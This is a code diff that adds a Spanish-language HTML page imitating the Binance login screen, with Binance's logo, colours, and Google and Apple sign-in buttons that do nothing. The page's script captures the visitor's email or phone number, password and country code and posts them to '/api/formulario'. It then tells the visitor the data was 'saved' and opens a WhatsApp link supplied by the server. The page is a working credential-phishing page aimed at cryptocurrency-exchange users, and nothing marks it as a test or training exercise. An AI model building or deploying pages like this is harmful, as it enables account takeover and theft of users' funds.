@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Iniciar sesión – Binance</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap');
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg-page: #0b0e11;
+      --bg-card: #1e2329;
+      --bg-input: #2b3139;
+      --border: #474d57;
+      --border-focus: #f0b90b;
+      --text-main: #eaecef;
+      --text-muted: #848e9c;
+      --yellow: #f0b90b;
+      --yellow-hover: #d4a309;
+      --btn-outline-bg: #2b3139;
+      --btn-outline-hover: #363c45;
+      --red: #f6465d;
+      --radius: 6px;
+    }
+
+    body {
+      font-family: 'IBM Plex Sans', sans-serif;
+      background: var(--bg-page);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-main);
+      padding: 24px 16px;
+    }
+
+    /* ── Logo ──────────────────────────────────── */
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 28px;
+    }
+
+    .logo svg {
+      width: 28px;
+      height: 28px;
+    }
+
+    .logo-text {
+      font-size: 20px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      color: var(--yellow);
+    }
+
+    /* ── Card ──────────────────────────────────── */
+    .card {
+      background: var(--bg-card);
+      border-radius: 12px;
+      padding: 40px 36px 36px;
+      width: 100%;
+      max-width: 420px;
+      position: relative;
+    }
+
+    /* ── QR icon ───────────────────────────────── */
+    .qr-btn {
+      position: absolute;
+      top: 36px;
+      right: 36px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--text-muted);
+      transition: color .2s;
+    }
+
+    .qr-btn:hover {
+      color: var(--yellow);
+    }
+
+    /* ── Heading ───────────────────────────────── */
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      
+      color: var(--text-main);
+    }
+
+    /* ── Label ─────────────────────────────────── */
+    label {
+      display: block;
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-bottom: 6px;
+    }
+
+    /* ── Field group ───────────────────────────── */
+    .field-group {
+      margin-bottom: 18px;
+    }
+
+    /* ── Phone row ─────────────────────────────── */
+    .phone-row {
+      display: flex;
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      overflow: visible;
+      transition: border-color .2s;
+    }
+
+    .phone-row:focus-within {
+      border-color: var(--border-focus);
+    }
+
+    .phone-row.error {
+      border-color: var(--red);
+    }
+
+    .country-select {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 0 12px;
+      background: var(--bg-input);
+      cursor: pointer;
+      border: none;
+      border-right: 1.5px solid var(--border);
+      color: var(--text-main);
+      font-family: inherit;
+      font-size: 14px;
+      white-space: nowrap;
+      user-select: none;
+      min-width: 80px;
+      position: relative;
+    }
+
+    .flag {
+      font-size: 18px;
+    }
+
+    .code {
+      font-size: 14px;
+    }
+
+    /* dropdown de países */
+    .country-dropdown {
+      display: none;
+      position: absolute;
+      top: calc(100% + 2px);
+      left: 0;
+      background: #2b3139;
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      z-index: 9999;
+      min-width: 180px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, .5);
+      overflow: hidden;
+    }
+
+    .country-dropdown.open {
+      display: block;
+    }
+
+    .country-option {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px;
+      cursor: pointer;
+      font-size: 14px;
+      transition: background .15s;
+    }
+
+    .country-option:hover {
+      background: #363c45;
+    }
+
+    .phone-input {
+      flex: 1;
+      background: var(--bg-input);
+      border: none;
+      outline: none;
+      color: var(--text-main);
+      font-family: inherit;
+      font-size: 15px;
+      padding: 13px 12px;
+    }
+
+    .phone-input::placeholder {
+      color: var(--text-muted);
+    }
+
+    .clear-btn {
+      background: none;
+      border: none;
+      padding: 0 12px;
+      cursor: pointer;
+      color: var(--text-muted);
+      font-size: 20px;
+      line-height: 1;
+      display: flex;
+      align-items: center;
+      transition: color .2s;
+    }
+
+    .clear-btn:hover {
+      color: var(--text-main);
+    }
+
+    /* ── Password field ────────────────────────── */
+    .password-wrap {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      overflow: hidden;
+      background: var(--bg-input);
+      transition: border-color .2s;
+    }
+
+    .password-wrap:focus-within {
+      border-color: var(--border-focus);
+    }
+
+    .password-wrap.error {
+      border-color: var(--red);
+    }
+
+    .password-wrap input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: var(--text-main);
+      font-family: inherit;
+      font-size: 15px;
+      padding: 13px 12px;
+    }
+
+    .password-wrap input::placeholder {
+      color: var(--text-muted);
+    }
+
+    .eye-btn {
+      background: none;
+      border: none;
+      padding: 0 12px;
+      cursor: pointer;
+      color: var(--text-muted);
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+      transition: color .2s;
+    }
+
+    .eye-btn:hover {
+      color: var(--text-main);
+    }
+
+    /* ── Error text ────────────────────────────── */
+    .error-msg {
+      font-size: 12px;
+      color: var(--red);
+      margin-top: 4px;
+      display: none;
+    }
+
+    .error-msg.visible {
+      display: block;
+    }
+
+    /* ── Divider ───────────────────────────────── */
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 20px 0;
+      color: var(--text-muted);
+      font-size: 13px;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    /* ── Primary button ────────────────────────── */
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      background: var(--yellow);
+      border: none;
+      border-radius: var(--radius);
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a1a;
+      cursor: pointer;
+      transition: background .2s, transform .1s, opacity .2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn-primary:hover {
+      background: var(--yellow-hover);
+    }
+
+    .btn-primary:active {
+      transform: scale(.98);
+    }
+
+    .btn-primary:disabled {
+      opacity: .6;
+      cursor: not-allowed;
+    }
+
+    /* spinner */
+    .spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(0, 0, 0, .3);
+      border-top-color: #1a1a1a;
+      border-radius: 50%;
+      animation: spin .6s linear infinite;
+      display: none;
+    }
+
+    .btn-primary.loading .spinner {
+      display: block;
+    }
+
+    .btn-primary.loading .btn-text {
+      display: none;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    /* ── Social buttons ────────────────────────── */
+    .btn-social {
+      width: 100%;
+      padding: 13px;
+      background: var(--btn-outline-bg);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      font-family: inherit;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--text-main);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: background .2s, border-color .2s;
+      margin-bottom: 12px;
+    }
+
+    .btn-social:last-of-type {
+      margin-bottom: 0;
+    }
+
+    .btn-social:hover {
+      background: var(--btn-outline-hover);
+      border-color: var(--text-muted);
+    }
+
+    .google-icon {
+      width: 18px;
+      height: 18px;
+    }
+
+    .apple-icon {
+      width: 18px;
+      height: 18px;
+      fill: var(--text-main);
+    }
+
+    /* ── Toast ─────────────────────────────────── */
+    .toast {
+      position: fixed;
+      bottom: 28px;
+      left: 50%;
+      transform: translateX(-50%) translateY(80px);
+      background: #2ebd85;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      transition: transform .35s ease;
+      z-index: 999;
+      white-space: nowrap;
+    }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .toast.error-toast {
+      background: var(--red);
+    }
+
+    /* ── Footer links ──────────────────────────── */
+    .footer-links {
+      margin-top: 28px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .footer-links a {
+      color: var(--yellow);
+      font-size: 14px;
+      text-decoration: none;
+      transition: opacity .2s;
+    }
+
+    .footer-links a:hover {
+      opacity: .75;
+    }
+
+    /* ── Bottom bar ────────────────────────────── */
+    .bottom-bar {
+      margin-top: 40px;
+      display: flex;
+      gap: 20px;
+      align-items: center;
+      color: var(--text-muted);
+      font-size: 12px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .bottom-bar a {
+      color: var(--text-muted);
+      text-decoration: none;
+    }
+
+    .bottom-bar a:hover {
+      color: var(--text-main);
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Logo -->
+  <div class="logo">
+    <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="16,2 25,9 16,16 7,9" fill="#f0b90b" />
+      <polygon points="4,13 11,19 4,25" fill="#f0b90b" />
+      <polygon points="28,13 21,19 28,25" fill="#f0b90b" />
+      <polygon points="16,18 25,23 16,30 7,23" fill="#f0b90b" />
+    </svg>
+    <span class="logo-text">BINANCE</span>
+  </div>
+
+  <!-- Card -->
+  <div class="card">
+
+    <!-- QR -->
+    <button class="qr-btn" title="QR" aria-label="QR login">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <rect x="3" y="3" width="7" height="7" rx="1" />
+        <rect x="14" y="3" width="7" height="7" rx="1" />
+        <rect x="3" y="14" width="7" height="7" rx="1" />
+        <rect x="5" y="5" width="3" height="3" fill="currentColor" stroke="none" />
+        <rect x="16" y="5" width="3" height="3" fill="currentColor" stroke="none" />
+        <rect x="5" y="16" width="3" height="3" fill="currentColor" stroke="none" />
+        <path d="M14 14h2v2h-2zM18 14h3v2h-1v1h-2zM14 18h2v3h-2zM18 19h1v3h-1z" fill="currentColor" stroke="none" />
+      </svg>
+    </button>
+
+    <div id="vistaIdentificador">
+      <h1>Iniciar sesión</h1>
+
+      <!-- Identificador -->
+      <div class="field-group">
+        <label for="phone">Correo o número de teléfono</label>
+        <div class="phone-row" id="phoneRow">
+
+          <!-- Selector de país -->
+          <div class="country-select" id="countrySelect" onclick="toggleDropdown(event) " style="display:none;">
+            <span class="flag" id="flag">🇨🇴</span>
+            <span class="code" id="dialCode">+57</span>
+            <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
+              <path d="M2 4l4 4 4-4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" />
+            </svg>
+            <!-- Dropdown -->
+            <div class="country-dropdown" id="countryDropdown">
+              <div class="country-option" onclick="selectCountry('🇨🇴','+57')">🇨🇴 Colombia +57</div>
+              <div class="country-option" onclick="selectCountry('🇺🇸','+1')">🇺🇸 Estados Unidos +1</div>
+              <div class="country-option" onclick="selectCountry('🇲🇽','+52')">🇲🇽 México +52</div>
+              <div class="country-option" onclick="selectCountry('🇦🇷','+54')">🇦🇷 Argentina +54</div>
+              <div class="country-option" onclick="selectCountry('🇪🇸','+34')">🇪🇸 España +34</div>
+              <div class="country-option" onclick="selectCountry('🇧🇷','+55')">🇧🇷 Brasil +55</div>
+              <div class="country-option" onclick="selectCountry('🇨🇱','+56')">🇨🇱 Chile +56</div>
+              <div class="country-option" onclick="selectCountry('🇵🇪','+51')">🇵🇪 Perú +51</div>
+            </div>
+          </div>
+
+          <input class="phone-input" id="phone" type="text" placeholder="Número de teléfono o correo"
+            oninput="detectarTipo(); clearError('phoneRow','phoneErr')" />
+          <button class="clear-btn" onclick="clearPhone()" aria-label="Borrar">×</button>
+        </div>
+        <span class="error-msg" id="phoneErr">Ingresa tu correo o número</span>
+      </div>
+      <button class="btn-primary" id="submitBtn" onclick="continuarProceso()">
+        <span class="spinner"></span>
+        <span class="btn-text">Continuar</span>
+      </button>
+      <div class="divider">o</div>
+
+      <!-- Google -->
+      <button class="btn-social">
+        <svg class="google-icon" viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
+          <path
+            d="M17.64 9.2c0-.637-.057-1.251-.164-1.84H9v3.481h4.844c-.209 1.125-.843 2.078-1.796 2.717v2.258h2.908c1.702-1.567 2.684-3.875 2.684-6.615z"
+            fill="#4285F4" />
+          <path
+            d="M9 18c2.43 0 4.467-.806 5.956-2.184l-2.908-2.258c-.806.54-1.837.86-3.048.86-2.344 0-4.328-1.584-5.036-3.711H.957v2.332A8.997 8.997 0 009 18z"
+            fill="#34A853" />
+          <path
+            d="M3.964 10.707A5.41 5.41 0 013.682 9c0-.593.102-1.17.282-1.707V4.961H.957A8.996 8.996 0 000 9c0 1.452.348 2.827.957 4.039l3.007-2.332z"
+            fill="#FBBC05" />
+          <path
+            d="M9 3.58c1.321 0 2.508.454 3.44 1.345l2.582-2.58C13.463.891 11.426 0 9 0A8.997 8.997 0 00.957 4.961L3.964 7.293C4.672 5.166 6.656 3.58 9 3.58z"
+            fill="#EA4335" />
+        </svg>
+        Continuar con Google
+      </button>
+
+      <!-- Apple -->
+      <button class="btn-social">
+        <svg class="apple-icon" viewBox="0 0 814 1000">
+          <path
+            d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.3-150.3-109.7c-50.8-72.7-90.5-186.8-90.5-295.6 0-135.5 88.1-207.3 174.5-207.3 55.2 0 101.3 36.3 135.8 36.3 32.8 0 84.5-38.5 148.3-38.5 24 0 108.2 2.2 168.6 80.6zm-159.5-199.8c30.5-36.2 52.1-86.5 52.1-136.8 0-7.1-.6-14.3-1.9-20.4-49.5 1.9-107.7 33.2-143.2 74.2-27.5 31.8-53.2 82.1-53.2 133.1 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 44.4 0 96.9-29.5 130.7-69.5z" />
+        </svg>
+        Continuar con Apple
+      </button>
+    </div>
+
+    
+
+
+
+
+    <div id="vistaPassword" style="display:none;">
+      <h1>Introduce tu <br> contraseña</h1>
+      <div id="usuarioSeleccionado" style="
+         display:none;
+         margin-bottom:20px;
+         color:#848e9c;
+         font-size:14px;">
+      </div>
+
+      <div class="field-group">
+        <label for="password">Contraseña</label>
+
+        <div class="password-wrap" id="passWrap">
+          <input id="password" type="password" placeholder="Contraseña" oninput="clearError('passWrap','passErr')" />
+
+          <button class="eye-btn" onclick="togglePass()" aria-label="Ver contraseña">
+
+            <span id="eyeIcon">👁️</span>
+
+          </button>
+        </div>
+
+        <span class="error-msg" id="passErr">
+          Ingresa tu contraseña
+        </span>
+
+      </div>
+
+      <button class="btn-primary" id="btnLogin" onclick="handleSubmit()">
+        <a href="#"></a>
+        <span class="spinner"></span>
+        <span class="btn-text">Continuar</span>
+
+      </button>
+
+    </div>
+  <!-- Footer -->
+    <div class="footer-links">
+      <a href="#">Crear una cuenta de Binance</a>
+      <a href="#">¿No puedes iniciar sesión?</a>
+    </div>
+
+    <div class="bottom-bar">
+      <span>🌐 Español (España)</span>
+      <a href="#">Cookies</a>
+      <a href="#">Privacidad</a>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast"></div>
+  </div>
+  <script>
+    let identificadorGuardado = '';
+
+    let pasoActual = 1;
+
+    function continuarProceso() {
+
+      if (pasoActual === 1) {
+
+        siguienteVista();
+
+        document.querySelector('.btn-text')
+          .textContent = 'Iniciar sesión';
+
+        pasoActual = 2;
+
+        return;
+      }
+
+      handleSubmit();
+    }
+    // ── País ──────────────────────────────────────────────────────
+    function toggleDropdown(e) {
+
+      e.stopPropagation();
+      document.getElementById('countryDropdown').classList.toggle('open');
+    }
+    function selectCountry(flagEmoji, code) {
+      document.getElementById('flag').textContent = flagEmoji;
+      document.getElementById('dialCode').textContent = code;
+      document.getElementById('countryDropdown').classList.remove('open');
+    }
+    document.addEventListener('click', () => {
+      document.getElementById('countryDropdown').classList.remove('open');
+    });
+
+
+    function detectarTipo() {
+
+      const input = document.getElementById('phone');
+      const country = document.getElementById('countrySelect');
+
+      const valor = input.value.trim();
+
+      if (!valor) {
+        country.style.display = 'none';
+        input.placeholder = 'Correo electrónico';
+        return;
+      }
+
+      const esTelefono = /^[0-9]+$/.test(valor);
+
+      if (esTelefono) {
+
+        country.style.display = 'flex';
+        input.placeholder = 'Número de teléfono';
+
+      } else {
+
+        country.style.display = 'none';
+        input.placeholder = 'Correo electrónico';
+
+      }
+    }
+    // ── Limpiar ───────────────────────────────────────────────────
+    function clearPhone() {
+      document.getElementById('phone').value = '';
+      document.getElementById('phone').focus();
+    }
+
+    // ── Contraseña ────────────────────────────────────────────────
+    let passVisible = false;
+    function togglePass() {
+      passVisible = !passVisible;
+      document.getElementById('password').type = passVisible ? 'text' : 'password';
+      document.getElementById('eyeIcon').textContent = passVisible ? '🙈' : '👁️';
+    }
+
+    // ── Errores ───────────────────────────────────────────────────
+    function showError(rowId, msgId) {
+      document.getElementById(rowId).classList.add('error');
+      document.getElementById(msgId).classList.add('visible');
+    }
+    function clearError(rowId, msgId) {
+      document.getElementById(rowId).classList.remove('error');
+      document.getElementById(msgId).classList.remove('visible');
+    }
+
+    // ── Toast ─────────────────────────────────────────────────────
+    function showToast(msg, isError = false) {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.className = 'toast' + (isError ? ' error-toast' : '');
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 3200);
+    }
+    function siguienteVista() {
+
+      const identificador =
+        document.getElementById('phone').value.trim();
+
+      if (!identificador) {
+
+        showError('phoneRow', 'phoneErr');
+        return;
+      }
+
+      identificadorGuardado = identificador;
+
+      document.getElementById('vistaIdentificador')
+        .style.display = 'none';
+
+      document.getElementById('vistaPassword')
+        .style.display = 'block';
+
+      const usuario =
+        document.getElementById('usuarioSeleccionado');
+
+      usuario.style.display = 'block';
+      usuario.textContent = identificador;
+
+      document.querySelector('h1').textContent =
+        'Introduce tu contraseña';
+    }
+    // ── Enviar ────────────────────────────────────────────────────
+    async function handleSubmit() {
+      const identificador = identificadorGuardado;
+      const contrasena = document.getElementById('password').value.trim();
+      const codigo_pais = document.getElementById('dialCode').textContent;
+
+      let ok = true;
+      if (!identificador) { showError('phoneRow', 'phoneErr'); ok = false; }
+      if (!contrasena) { showError('passWrap', 'passErr'); ok = false; }
+      if (!ok) return;
+
+      // Estado de carga
+      const btn = document.getElementById('submitBtn');
+      btn.classList.add('loading');
+      btn.disabled = true;
+
+      try {
+        const res = await fetch('/api/formulario', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ identificador, contrasena, codigo_pais }),
+        });
+
+        const data = await res.json();
+
+        if (!res.ok) {
+          showToast(data.detail || 'Error al guardar', true);
+          return;
+        }
+
+        showToast('✅ Datos guardados. Abriendo WhatsApp…');
+
+        // Abrir WhatsApp en nueva pestaña después de 800 ms
+        setTimeout(() => {
+          window.open(data.whatsapp_url, '_blank');
+        }, 800);
+
+      } catch (err) {
+        showToast('No se pudo conectar al servidor', true);
+      } finally {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+      }
+    }
+  </script>
+</body>
+
+</html>
